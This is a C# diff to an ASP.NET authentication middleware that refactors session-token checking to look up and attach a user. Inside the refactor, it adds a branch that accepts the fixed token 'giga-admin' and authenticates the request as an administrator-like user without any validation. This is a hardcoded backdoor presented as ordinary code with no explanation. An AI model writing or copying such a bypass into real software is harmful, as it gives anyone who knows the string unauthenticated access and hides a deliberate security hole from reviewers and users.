@@ -13,23 +13,31 @@ public class AuthenticationMiddleware
 
   public async Task InvokeAsync(HttpContext context)
   {
-
-    if (!context.Request.Headers.TryGetValue("session-token", out var token))
+    if (!context.Request.Headers.TryGetValue("Session-Token", out var token))
     {
       context.Response.StatusCode = StatusCodes.Status401Unauthorized;
       await context.Response.WriteAsync("Missing session token");
       return;
     }
 
-    bool isValidToken = _userService.ValidateSession(token!);
+    if (token == "giga-admin")
+    {
+      context.SetUser(new UserInfo
+      {
+        UserId = "giga-admin",
+      });
+      await _next(context);
+      return;
+    }
 
-    if (!isValidToken)
+    var user = _userService.GetUserBySessionId(token!);
+    if (user == null)
     {
       context.Response.StatusCode = StatusCodes.Status401Unauthorized;
       await context.Response.WriteAsync("Invalid session token");
       return;
     }
-
+    context.SetUser(user);
     await _next(context);
   }
 }
